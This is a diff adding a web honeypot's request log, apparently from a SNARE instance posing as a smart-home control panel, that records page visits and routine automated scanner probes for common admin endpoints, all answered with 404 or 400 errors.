@@ -1,0 +1,1021 @@
+2025-06-29 14:42:34 DEBUG:asyncio:__init__: Using selector: EpollSelector
+2025-06-29 14:42:44 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:42:44 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:44 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:44 INFO:snare.server:handle_request: Request path: /login.css
+2025-06-29 14:42:44 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:44 +0000] "GET /login.css HTTP/1.1" 200 1811 "http://20.123.44.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:44 INFO:snare.server:handle_request: Request path: /assets/js/auth.js
+2025-06-29 14:42:44 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:44 +0000] "GET /assets/js/auth.js HTTP/1.1" 200 339 "http://20.123.44.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:50 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-29 14:42:50 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:50 +0000] "GET /favicon.ico HTTP/1.1" 404 433 "http://20.123.44.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:57 INFO:snare.server:handle_request: Request path: /dashboard.html
+2025-06-29 14:42:57 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:57 +0000] "GET /dashboard.html HTTP/1.1" 200 2853 "http://20.123.44.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:58 INFO:snare.server:handle_request: Request path: /vendor/bootstrap/css/bootstrap.min.css
+2025-06-29 14:42:58 INFO:snare.server:handle_request: Request path: /assets/css/fontawesome.css
+2025-06-29 14:42:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:58 +0000] "GET /assets/css/fontawesome.css HTTP/1.1" 200 123364 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:58 INFO:snare.server:handle_request: Request path: /vendor/jquery/jquery.min.js
+2025-06-29 14:42:58 INFO:snare.server:handle_request: Request path: /assets/css/style.css
+2025-06-29 14:42:58 INFO:snare.server:handle_request: Request path: /vendor/bootstrap/js/bootstrap.min.js
+2025-06-29 14:42:58 INFO:snare.server:handle_request: Request path: /assets/js/custom.js
+2025-06-29 14:42:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:58 +0000] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 87121 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:58 +0000] "GET /assets/js/custom.js HTTP/1.1" 200 6474 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:58 +0000] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 60754 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:58 +0000] "GET /assets/css/style.css HTTP/1.1" 200 35951 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:58 +0000] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 220973 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:58 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:42:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:58 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:58 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:42:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:58 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:58 INFO:snare.server:handle_request: Request path: /assets/images/logo.png
+2025-06-29 14:42:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:42:58 +0000] "GET /assets/images/logo.png HTTP/1.1" 200 427 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:42:59 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:42:59 INFO:aiohttp.access:log: 185.218.84.178 [29/Jun/2025:14:42:59 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 14:43:02 INFO:snare.server:handle_request: Request path: /dashboard.html
+2025-06-29 14:43:02 INFO:aiohttp.access:log: 83.94.121.199 [29/Jun/2025:14:43:02 +0000] "GET /dashboard.html HTTP/1.1" 200 2913 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+2025-06-29 14:43:02 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-29 14:43:02 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:02 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:02 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:43:02 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:02 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:02 INFO:snare.server:handle_request: Request path: /vendor/bootstrap/css/bootstrap.min.css
+2025-06-29 14:43:02 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:43:02 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:02 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:02 INFO:aiohttp.access:log: 83.94.121.199 [29/Jun/2025:14:43:02 +0000] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 220973 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+2025-06-29 14:43:02 INFO:snare.server:handle_request: Request path: /assets/css/fontawesome.css
+2025-06-29 14:43:02 INFO:aiohttp.access:log: 83.94.121.199 [29/Jun/2025:14:43:02 +0000] "GET /assets/css/fontawesome.css HTTP/1.1" 200 123364 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+2025-06-29 14:43:02 INFO:snare.server:handle_request: Request path: /vendor/bootstrap/js/bootstrap.min.js
+2025-06-29 14:43:02 INFO:snare.server:handle_request: Request path: /assets/css/style.css
+2025-06-29 14:43:02 INFO:snare.server:handle_request: Request path: /vendor/jquery/jquery.min.js
+2025-06-29 14:43:02 INFO:aiohttp.access:log: 83.94.121.199 [29/Jun/2025:14:43:02 +0000] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 60754 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+2025-06-29 14:43:02 INFO:aiohttp.access:log: 83.94.121.199 [29/Jun/2025:14:43:02 +0000] "GET /assets/css/style.css HTTP/1.1" 200 35951 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+2025-06-29 14:43:02 INFO:aiohttp.access:log: 83.94.121.199 [29/Jun/2025:14:43:02 +0000] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 87121 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+2025-06-29 14:43:02 INFO:snare.server:handle_request: Request path: /assets/js/custom.js
+2025-06-29 14:43:02 INFO:aiohttp.access:log: 83.94.121.199 [29/Jun/2025:14:43:02 +0000] "GET /assets/js/custom.js HTTP/1.1" 200 6474 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+2025-06-29 14:43:03 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:43:03 INFO:aiohttp.access:log: 83.94.121.199 [29/Jun/2025:14:43:03 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+2025-06-29 14:43:03 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:43:03 INFO:aiohttp.access:log: 83.94.121.199 [29/Jun/2025:14:43:03 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 159.89.16.119 [29/Jun/2025:14:43:08 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /sdk
+2025-06-29 14:43:08 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /odinhttpcall1751208188
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 159.89.16.119 [29/Jun/2025:14:43:08 +0000] "POST /sdk HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 159.89.16.119 [29/Jun/2025:14:43:08 +0000] "GET /odinhttpcall1751208188 HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 159.89.16.119 [29/Jun/2025:14:43:08 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /HNAP1
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 159.89.16.119 [29/Jun/2025:14:43:08 +0000] "GET /HNAP1 HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /evox/about
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 159.89.16.119 [29/Jun/2025:14:43:08 +0000] "GET /evox/about HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 159.89.16.119 [29/Jun/2025:14:43:08 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 159.89.16.119 [29/Jun/2025:14:43:08 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /cgi-bin/authLogin.cgi
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /solr/admin/info/system
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /query?q=SHOW+DIAGNOSTICS
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 104.248.139.208 [29/Jun/2025:14:43:08 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /v2/_catalog
+2025-06-29 14:43:08 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 64.225.101.100 [29/Jun/2025:14:43:08 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 64.225.101.100 [29/Jun/2025:14:43:08 +0000] "GET /solr/admin/info/system HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 134.209.248.231 [29/Jun/2025:14:43:08 +0000] "GET /v2/_catalog HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 159.223.17.172 [29/Jun/2025:14:43:08 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 14:43:08 INFO:aiohttp.access:log: 134.122.83.190 [29/Jun/2025:14:43:08 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
+2025-06-29 14:43:09 INFO:aiohttp.access:log: 104.248.139.208 [29/Jun/2025:14:43:09 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 14:43:09 INFO:snare.server:handle_request: Request path: /solr/admin/cores?action=STATUS&wt=json
+2025-06-29 14:43:09 INFO:aiohttp.access:log: 64.225.101.100 [29/Jun/2025:14:43:09 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 14:43:09 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-29 14:43:09 INFO:aiohttp.access:log: 159.65.2.115 [29/Jun/2025:14:43:09 +0000] "GET /favicon.ico HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 14:43:14 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:43:14 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:14 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:14 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:43:14 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:14 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:14 INFO:snare.server:handle_request: Request path: /assets/images/logo.png
+2025-06-29 14:43:14 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:14 +0000] "GET /assets/images/logo.png HTTP/1.1" 200 427 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:15 INFO:snare.server:handle_request: Request path: /thermostat.html
+2025-06-29 14:43:15 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:15 +0000] "GET /thermostat.html HTTP/1.1" 200 5101 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:15 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:43:15 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:15 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:15 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:43:15 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:15 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:26 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:43:26 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:26 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:26 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:43:26 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:26 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:26 INFO:snare.server:handle_request: Request path: /assets/images/logo.png
+2025-06-29 14:43:26 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:26 +0000] "GET /assets/images/logo.png HTTP/1.1" 200 427 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:27 INFO:snare.server:handle_request: Request path: /appliances.html
+2025-06-29 14:43:27 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:27 +0000] "GET /appliances.html HTTP/1.1" 200 6956 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:27 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:43:27 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:27 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:27 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:43:27 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:27 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:36 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:43:36 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:36 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:36 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:43:36 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:36 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:36 INFO:snare.server:handle_request: Request path: /assets/images/logo.png
+2025-06-29 14:43:36 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:36 +0000] "GET /assets/images/logo.png HTTP/1.1" 200 427 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:37 INFO:snare.server:handle_request: Request path: /printer.html
+2025-06-29 14:43:37 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:37 +0000] "GET /printer.html HTTP/1.1" 200 4496 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:37 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:43:37 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:37 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:43:37 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:43:37 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:43:37 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:50 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:49:50 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:50 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:50 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:49:50 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:50 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:50 INFO:snare.server:handle_request: Request path: /assets/images/logo.png
+2025-06-29 14:49:50 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:50 +0000] "GET /assets/images/logo.png HTTP/1.1" 200 427 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:52 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:49:52 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:52 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:52 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:49:52 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:52 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:53 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 14:49:53 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:49:53 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:53 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:53 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 14:49:53 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:49:53 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:53 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:54 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 14:49:54 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:49:54 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:54 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:55 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 14:49:55 INFO:snare.server:handle_request: POST data:
